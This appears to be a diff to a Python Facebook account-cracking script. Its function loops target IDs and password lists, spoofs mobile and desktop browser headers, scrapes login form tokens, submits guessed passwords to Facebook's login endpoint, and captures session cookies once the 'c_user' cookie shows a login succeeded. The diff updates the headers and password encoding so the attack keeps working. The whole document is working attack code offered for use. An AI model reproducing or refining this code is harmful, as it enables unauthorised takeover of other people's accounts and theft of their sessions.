@@ -284,7 +284,7 @@ def rndm2(ids,passlist,mthd_svr,fb):
             lenovo = ("L18021","PAGK0027IN","L19111","L10041","A7010a48","K350t","K33a48","Lenovo K7","K8 Note","L38043","PAFR0026IN","Lenovo K11","Lenovo K12","Lenovo K13","Lenovo K14")
             ua1 = "Mozilla/5.0 (Linux; Android "+str(random.randint(4,13))+"; "+str(random.choice(lenovo))+"; Windows 10 Mobile) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/"+str(random.randint(84,106))+".0."+str(random.randint(4200,4900))+"."+str(random.randint(40,140))+" Mobile Safari/537.36"
             #ua3 = f"Mozilla/5.0 (Linux; Android "+str(random.randint(4,14))+"; "+str(random.choice(mdlx))+") AppleWebKit/537.36 (KHTML, like Gecko) Chrome/"+str(random.randint(84,106))+".0."+str(random.randint(4200,4900))+"."+str(random.randint(40,140))+" Mobile Safari/537.36"
-            referer_url = 'https://www.facebook.com/login/web/?cuid=AYjpakrqTxrj5wFmV-QKHtvBbm2N0-lN7kL6BSohrV5OSxEQiELa8jUVPNKttxFGxP_fEKh2T4jjljwjvXxMxv_CLYnEqFpruZ4J2J-leEJbo7bKf5HIH2jW5aGCKe2zHZVeNfNwvo7aTAsQuFox5426R-oiVC3bV5-Mv6FylyvXu-4TlUVzq3_kNNNbXYJB95Elmh2S5rxVZGI6E8ORDJzoYWa9H2aU5wo4u9V5NE68uP6w4LXSEFcMbPZ91JWBUUznW4V3s0vc7lLiWt12J-cpexhphXL9pzjsXIURSjPNng&email=8389066877&is_from_lara=1'
+            referer_url = f'https://www.facebook.com/login/web/?cuid=AYjpakrqTxrj5wFmV-QKHtvBbm2N0-lN7kL6BSohrV5OSxEQiELa8jUVPNKttxFGxP_fEKh2T4jjljwjvXxMxv_CLYnEqFpruZ4J2J-leEJbo7bKf5HIH2jW5aGCKe2zHZVeNfNwvo7aTAsQuFox5426R-oiVC3bV5-Mv6FylyvXu-4TlUVzq3_kNNNbXYJB95Elmh2S5rxVZGI6E8ORDJzoYWa9H2aU5wo4u9V5NE68uP6w4LXSEFcMbPZ91JWBUUznW4V3s0vc7lLiWt12J-cpexhphXL9pzjsXIURSjPNng&email={ids}&is_from_lara=1'
             cuidv = session.get(referer_url).text
             logn_data = {
             'jazoest':re.search('name="jazoest" value="(.*?)"', str(cuidv)).group(1),
@@ -308,33 +308,35 @@ def rndm2(ids,passlist,mthd_svr,fb):
             'had_cp_prefilled': 'false',
             'had_password_prefilled': 'false',
             'ab_test_data': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAK/KKAAAAAAAEAA',
-            'encpass': '#PWD_BROWSER:5:1724503742:AdxQAK5yMsTmwhiAOuOBLv+LJZ420rIlAUhdhcxNhZn+0nZfvZK1fCITx6TqgItExzPzPWdCI/aqsAvJqPHzZpFIl7KMajDqqdFh5W+itQQqUnaHlF/Y+F38/Y2waFtrAe0HTn/ZGhuLd5yF',}
-            user_info = {'Host': f'{fb}.facebook.com',
-            'Connection': 'keep-alive',
-            'Content-Length': '{len(str(logn_data))}',
-            'sec-ch-ua': '"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"',
-            'sec-ch-ua-model': '"CPH2389"',
-            'sec-ch-ua-mobile': '?1',
-            'User-Agent': ua1,
-            'viewport-width': '400',
-            'Content-Type': 'application/x-www-form-urlencoded',
-            'X-FB-LSD': re.search('name="lsd" value="(.*?)"', str(git_fb)).group(1),
-            'sec-ch-ua-platform-version': '"9.7.1"',
-            'X-ASBD-ID': '129477',
-            'dpr': '1.8',
-            'sec-ch-ua-full-version-list': '"Google Chrome";v="105.0.5195.136", "Not)A;Brand";v="8.0.0.0", "Chromium";v="105.0.5195.136"',
+            'encpass': "#PWD_BROWSER:0:{}:{}".format(re.search('name="m_ts" value="(.*?)"',str(free_fb)).group(1),pww),}
+            user_info = {'authority': 'www.facebook.com',
+            'method': 'POST',
+            'path': '/login/device-based/regular/login/?login_attempt=1&lwv=101',
+            'scheme': 'https',    
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'accept-language': 'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7,hi;q=0.6,gu;q=0.5',
+            'cache-control': 'max-age=0',
+            'content-type': 'application/x-www-form-urlencoded',
+            'dpr': '1',
+            'origin': 'https://www.facebook.com',
+            'priority': 'u=0, i',
+            'referer': referer_url,
             'sec-ch-prefers-color-scheme': 'dark',
-            'sec-ch-ua-platform': '"Android"',
-            'Accept': '*/*',
-            'Origin': f'https://{fb}.facebook.com',
-            'Sec-Fetch-Site': 'same-origin',
-            'Sec-Fetch-Mode': 'cors',
-            'Sec-Fetch-Dest': 'empty',
-            'Referer': f'https://{fb}.facebook.com/',
-            'Accept-Encoding': 'gzip, deflate, br',
-            'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',}
+            'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
+            'sec-ch-ua-full-version-list': '"Not)A;Brand";v="99.0.0.0", "Google Chrome";v="127.0.6533.120", "Chromium";v="127.0.6533.120"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-model': '""',
+            'sec-ch-ua-platform': '"Windows"',
+            'sec-ch-ua-platform-version': '"10.0.0"',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'same-origin',
+            'sec-fetch-user': '?1',
+            'upgrade-insecure-requests': '1',
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
+            'viewport-width': '885',}
             url = f"https://{fb}.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
-            sxr_respns = session.post(url,data=logn_data, headers=user_info,allow_redirects=False).text
+            sxr_respns = session.post(url, headers=user_info, data=logn_data,allow_redirects=False).text
             login_coki=session.cookies.get_dict().keys()
             if 'c_user' in login_coki:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
